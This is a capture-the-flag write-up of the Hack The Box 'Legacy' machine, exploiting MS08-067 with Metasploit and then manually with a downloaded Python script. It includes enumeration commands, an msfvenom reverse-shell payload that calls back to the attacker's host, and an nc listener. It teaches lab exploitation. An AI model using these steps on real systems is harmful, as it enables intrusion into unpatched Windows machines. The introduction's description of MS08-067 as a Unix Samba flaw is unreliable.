
# Main Title

Legacy - 10.10.10.4

![](/images/legacy/1. legacy.png "Legacy Info Card")

Contents:

1. TOC
{:toc}

<p>&nbsp;</p>
=======================================================

## Introduction

=======================================================

Legacy is another early, easy machine from the Hack the Box platform.

<p>&nbsp;</p>
=======================================================

## Tools & Techniques Used

=======================================================

To root this machine we will use Metasploit to exploit a vulnerable version of Unix Samba Server documented in MS08-067.  This particular exploit is a Remote Command Injection Vulnerability and obtains root privileges instantly.
After using Metasploit, we will also find a python script which exploits the same vulnerability, generate our own shellcode using msfvenom, and then run the python script for manual exploitation.

<p>&nbsp;</p>



===========================================
Scanning & Enumeration
===========================================


First off, we will start with a standard nmap command to see what initially shows as open:

    nmap -A -T4 10.10.10.4

![](/images/legacy/2. nmap.png "nmap")

So it looks like a Windows XP, possibly SP3 machine.

Ports 139, 445, and 3389 are open.  

Here are some further details from the scan:

![](/images/legacy/3. nmap.png "nmap")

Looks like we have some access via smb, port 139.  

We can try smbclient:  smbclient -NL 10.10.10.4

smbclient attempts to use smb to connect to port 139 by default

-N means no login info, anonymous login attempt

-L means list shares

10.10.10.4 is the IP address of the target

    smbclient -NL 10.10.10.4

![](/images/legacy/4. smbclient-1.png "smbclient")

No joy there. We can also try to force a certain level of the smb protocol by adding the option “--option='client min protocol=NT1'”

    smbclient --option='client min protocol=NT1' -NL 10.10.10.4

![](/images/legacy/5. smbclient-2.png "smbclient")

We can try Metasploit's smb_scanner:

    msfconsole

    use auxiliary/scanner/smb/smb_version

    show options

![](/images/legacy/6. msf smb_version.png "smb_scanner")

We must set the target via the RHOSTS (or rhosts, this is not case sensitive) variable. 

    set rhosts 10.10.10.4
    
    run

![](/images/legacy/7. msf smb_version_2.png "smb_scannner")

→ These scan results show it to be a Windows XP SP3 machine via port 445.
→ Next, let's see what Google results we can find:



→ The top two results mention MS08-067, so that is our first avenue we will explore.
→ The rapid7.com linke will most likely contain details for a metasploit module, so we can start there.





→ So, here we have the description of the exploit and the msf commands to run.  Let's move on to exploitation via Metasploit:




===========================================
Exploitation via Metasploit
===========================================

→ In your metasploit window, let's confirm the module is still present:
   ⇒ search ms08-067



→ Next we load the module:
   ⇒ use exploit/windows/smb/ms08_067_netapi
   ⇒ alternatively, if you searched for it you can reference by the # listed above: use 0
→ First up, we want to see our options:
   ⇒ show options



→ Looks like we only need to set the RHOSTS setting and then run it:
   ⇒ set rhosts 10.10.10.4
   ⇒ run



→ And we have a meterpreter shell!
→ First two commands you should run anytime you have a meterpreter shell on a Windows machine:
   ⇒ getuid
   ⇒ sysinfo



→ NT AUTHORITY\SYSTEM means we have root level access to the machine
→ And the sysinfo output confirms this is Windows XP, SP3, 32-bit (x86)

→ Next you can upgrade to a shell to find the flags:



→ Flags are normally on the desktop of the various users. For Windows XP we need to go to Documents and Settings first:
   ⇒ cd C:\"Documents and Settings"



→ We have users Administrator and john.  
   ⇒ user flag: type john\Desktop\user.txt
   ⇒ root flag: type Administrator\Desktop\root.txt



→ And we have our two flags.




===========================================
Manual Exploitation
===========================================

→ To exploit manually we will need to download some code to run. The first place we look is on exploit-db.com, so let's re-run our Google search for that site specifically:



→ The last link shown here is for a github.com repo. Since this exploit is so old, we will try the GitHub version first as these tend to be better maintained:
   ⇒ https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py

→ Click on the link then click the “Raw” button to view the raw code.  



→ Copy/paste this raw code into a new python file on your Kali machine.  I'm using gedit and naming the file “smb-exploit.py”



→ Next scroll down until you see a commented section about shellcode:



→ So we need to generate our own shellcode and input it below. There are even sample commands for us to use in the comments.  
→ Since we ran meterpreter payload when exploiting via metasploit above, I am going to use a windows/shell_reverse_tcp payload this time.
→ My command to generate the shellcode is:
   ⇒ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
   ⇒ For an explanation of the options:
      • -p is for payload, in this case windows/shell_reverse_tcp
      • LHOST is our attacking machine where we are going to be listening for the reverse connection
      • LPORT is the port we want to receive the callback at, 443 in this case
      • EXITFUNC=thread is an option that provides additional stability in this case
      • -b is for “bad characters” or bytecode characters that our shellcode should not contain
      • -f is for format, ‘c’ in this case which would normally be for c code. even though we are using a python script in this case, all we are using is the shellcode. if you use “-f python” it will give you similar shellcode, but formatted differently. 
      • -a is for architecture, “x86” in this case for a 32-bit machine
      • --platform is for the type of machine, again in this case Windows



→ Copy/paste the shellcode (highlighted in the red box above) into the python exploit. Remove the ‘;’ at the end.



→ I also edited the comment at the top of that screenshot to show my actual IP address and port used for the shellcode.
→ Save the python file and run it without any options.  If you have not done “chmod +x smb-exploit.py” yet, do so first.



→ So we see example usage here. Since we know this is Windows XP SP3 English from the metasploit scanner earlier, we can choose option 6.  
→ But before we run our exploit, we need to set up our nc listener in a separate terminal window:
   ⇒ nc -lvnp 443



→ Now back in the first terminal window, we can run the exploit:
   ⇒ ./smb-exploit.py 10.10.10.4 6 445



→ Once you see the ‘Exploit finish’ message, check over in your second terminal window and you should see:



→ Here we have a shell on a Windows machine!  Since this is a Windows XP box, “whoami” is not likely to work, but the fact we are in the Windows\system32 directory likely means we are NT AUTHORITY\System, or “root”.  
→ As a best practice though, run the command “systeminfo” to see what type of machine we are on:




→ And then onward to collect our flags.  Same as before, change directory into “C:\Documents and Settings” and from there you can issue a single command for each flag file: root.txt and user.txt



→ Success!

